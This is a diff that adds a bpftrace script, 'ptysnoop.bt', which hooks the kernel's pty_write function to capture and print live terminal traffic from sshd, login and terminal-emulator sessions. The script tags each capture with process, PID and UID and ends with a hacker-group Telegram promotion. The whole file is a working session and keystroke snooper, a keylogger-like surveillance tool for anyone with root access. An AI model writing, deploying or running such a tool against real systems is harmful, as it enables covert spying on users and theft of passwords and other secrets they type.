@@ -1,0 +1,109 @@
+#! /usr/bin/env bpftrace
+
+/*
+ * bpftrace -B none ./ptysnoop.bt [PTY number]...
+ *
+ * Example 1 - Snoop on sshd, login and xterms:
+ *   bpftrace -B none ./ptysnoop.bt
+ *
+ * Example 1 - Snoop on /dev/pty/0, ... /dev/pty/3:
+ *   bpfrace -B none 0 1 2 3
+ *
+ * FAQ:
+ *   1. Download the latest bpftrace static binary for Linux:
+ *      curl -o bpftrace -fL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
+ *
+ * Limitations:
+ *  - The buffer may contain \x0d in the middle and it wont translate to \n.
+ */
+
+BEGIN
+{
+    @last_special = 0x0d;
+
+    if ($# == 0) { return; }
+
+    @is_tty_snoop = 1;
+    if ($# >= 1) { @all_tty[$1] = 1; }
+    if ($# >= 2) { @all_tty[$2] = 1; }
+    if ($# >= 3) { @all_tty[$3] = 1; }
+    if ($# >= 4) { @all_tty[$4] = 1; }
+    if ($# >= 5) { @all_tty[$5] = 1; }
+    if ($# >= 6) { @all_tty[$6] = 1; }
+    if ($# >= 7) { @all_tty[$7] = 1; }
+    if ($# >= 8) { @all_tty[$8] = 1; }
+    if ($# >= 9) { @all_tty[$9] = 1; }
+    if ($# >= 10) { @all_tty[$10] = 1; }
+    if ($# >= 11) { @all_tty[$11] = 1; }
+    if ($# >= 12) { @all_tty[$12] = 1; }
+}
+
+END
+{
+    delete(@last_special);
+    delete(@last_id);
+    delete(@is_tty_snoop);
+    printf("\n\x1b[1;37mJoin us on Telegram - https://t.me/thcorg\x1b[0m");
+}
+
+kfunc:pty_write
+/args->tty->count == 1/              // only master TTY
+{
+    if (@is_tty_snoop > 0) {
+        if (@all_tty[args->tty->index] == 0) { return; }
+    } else {
+        if (comm == "sshd") { $hit = 1; }
+        if ($hit == 0 && strcontains(comm, "term") == 1) { $hit = 1; }
+        if ($hit == 0 && comm == "login") { $hit = 1; }
+        if ($hit == 0) { return; }
+    }
+
+    $b = args->buf;
+    $len = args->c;
+
+    $last_id = @last_id;
+    $this_id = (uint64)args->tty;
+
+    // Do not output Arrow-UP/DOWN
+    if ($len == 3 && $b[0] == 0x1b) { return; }
+
+    $special = -1;
+    if ($len == 1) {
+        // Special character. Only output ONCE
+        if ($b[0] < 0x20 || $b[0] > 0x7e) {
+            $special = $b[0];
+        }
+    }
+
+    if ($last_id != $this_id) {
+        // PID has changed
+        // Don't output if the user just presses enter or other special single input.
+        if ($special >= 0) { return; }
+        // Go to new line unless we are already on a new line.
+        if (@last_special != 0x0d) { printf("\n"); }
+        printf(">>>> \x1b[0;33m%s\x1b[0m %d /dev/pty/%d (uid=%d):\n", comm, pid, args->tty->index, uid);
+        // Record a successful switch to new prompt
+        @last_id = $this_id;
+        @last_special = 0x0d;
+    }
+
+    if ($special >= 0) {
+        // Only output special characters ONCE.
+        if (@last_special == $special) { return; }
+        // Never output if at the beginning of a new line
+        if (@last_special == 0x0d) { return; }
+
+        if ($special == 0x08 || $special == 0x7f) {
+            printf("\x1b[2m\\d\x1b[0m");  // DEL
+        } else if ($special == 0x09) {
+            printf("\x1b[2m\\t\x1b[0m");  // TAB
+        } else if ($special == 0x0d) {
+            printf("\n");
+        }
+        @last_special = $special;
+        return;
+    }
+    @last_special = -1;
+
+    printf("%r", buf($b, $len));
+}    
